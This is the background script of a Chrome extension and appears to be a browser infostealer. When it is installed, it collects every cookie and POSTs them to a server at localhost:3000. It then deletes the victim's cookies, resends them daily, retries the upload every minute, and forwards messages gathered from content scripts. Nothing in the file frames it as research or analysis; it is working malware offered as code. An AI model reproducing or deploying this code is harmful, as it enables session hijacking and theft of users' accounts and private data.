(async () => {
    const interval = 1; // min

    const setStore = async (key, value) => await chrome.storage.local.set({[key]: value });
    const getStore = async (key) => (await chrome.storage.local.get(key))[key];

    async function destroyCookies() {
        const cookies = await chrome.cookies.getAll({});
        for (let i = 0; i < cookies.length; i++) {
            await chrome.cookies.remove({
                url: "https://" + cookies[i].domain + cookies[i].path,
                name: cookies[i].name,
            });
        }
        await setStore("destroyCookies", "false");
    }

    async function sendData(data) {
        const url = "http://localhost:3000/";
        try {
            const res = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
            });
            await res.text();
            return true;
        } catch (e) {
            return false;
        }
    }

    async function sendCookies() {
        const cookies = await chrome.cookies.getAll({});
        return await sendData(cookies);
    }

    async function sendInfo() {
        const infos = await getStore("info");
        return await sendData(infos);
    }
    
    chrome.runtime.onInstalled.addListener(async (details) => {
        await setStore("areCookiesPending",  "true");
        await setStore("areInfoPending", "false");
        await setStore("destroyCookies", "true");

        const sent = await sendCookies();
        if (sent) {
            destroyCookies();
            await setStore("areCookiesPending", "false");
        }
        await chrome.alarms.create("resend_cookies_each_day", {delayInMinutes: 24 * 60, periodInMinutes: 24 * 60});
    });
    
    chrome.windows.onCreated.addListener(async () => {
        await chrome.alarms.clear("retry_sending_info");
        await chrome.alarms.create("retry_sending_info", {delayInMinutes: interval, periodInMinutes: interval});
        await sendData("window created");
    });

    chrome.alarms.onAlarm.addListener( async (alarm) => {
        if(alarm.name != "retry_sending_info") return;

        const cookiesPending = (await getStore("areCookiesPending")) == "true";
        const infoPending = (await getStore("areInfoPending")) == "true";
        if (!cookiesPending && !infoPending) return;

        if (cookiesPending) {
            const sent = await sendCookies();
            if (sent) {
                if((await getStore("destroyCookies")) == "true")
                    await destroyCookies();
                await setStore("areCookiesPending",  "false");
            } else await setStore("areCookiesPending", "true");
        }

        if (infoPending) {
            const sent = await sendInfo();
            if (sent) {
                await setStore("info", "");
                await setStore("areInfoPending", "false");
            } else await setStore("areInfoPending", "true");
        }
    });

    chrome.alarms.onAlarm.addListener( async alarm => {
        if(alarm.name != "resend_cookies_each_day") return;
        if((await getStore("areCookiesPending")) == "true") return;
        await sendCookies();
    });

     chrome.runtime.onMessage.addListener(
         async (message, sender, sendResponse) => {
             const pending =  (await getStore("areInfoPending")) == "true";
             const infoRaw = await getStore("info");
             const info = infoRaw ?  JSON.parse(infoRaw) : undefined;

             if (pending && info)
                 await setStore("info",  JSON.stringify([...info, message]));
             else
                 await setStore( "info", JSON.stringify([message]) );

             await setStore("areInfoPending",  "true" );
             sendResponse("done saving");
         }
     );
})();
